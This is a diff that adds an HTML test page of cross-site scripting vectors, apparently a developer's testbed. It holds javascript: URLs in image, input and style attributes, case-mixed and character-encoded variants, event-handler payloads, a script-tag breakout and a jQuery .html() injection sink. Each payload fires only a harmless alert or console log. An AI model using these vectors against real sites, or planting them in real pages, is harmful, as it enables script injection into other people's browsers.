@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta charset="utf-8">
+		<title></title>
+	</head>
+	<!-- onload="alert(999)" -->
+	<body>
+		<div id="test"></div>
+		<DIV STYLE="background-image: url(javascript:alert('XSS'))">
+			<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
+			<IMG DYNSRC="javascript:alert('XSS');">
+			<IMG LOWSRC="javascript:alert('XSS');">
+			<IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">
+			<IMG SRC=javascript:alert('XSS')>
+			<IMG SRC=javascript:alert(&quot;XSSS&quot;)>
+			<IMG SRC="javascript:alert('XSSS')">
+			<IMG SRC=JaVaScRiPt:alert('XSSR')>
+			<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
+			<IMG SRC=# onmouseover="alert('xxs#')">
+			<IMG SRC=onmouseover="alert('xxs')">
+			<!-- <img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041"> -->
+			<!-- <IMG """><SCRIPT>alert("XSSdddd")</SCRIPT>"> -->
+	</body>
+	<script src="js/jquery.min.js"></script>
+	<script>
+		var xssStr = '<script>console.log(1)';
+		$('#test').html(xssStr);
+	</script>
+</html>
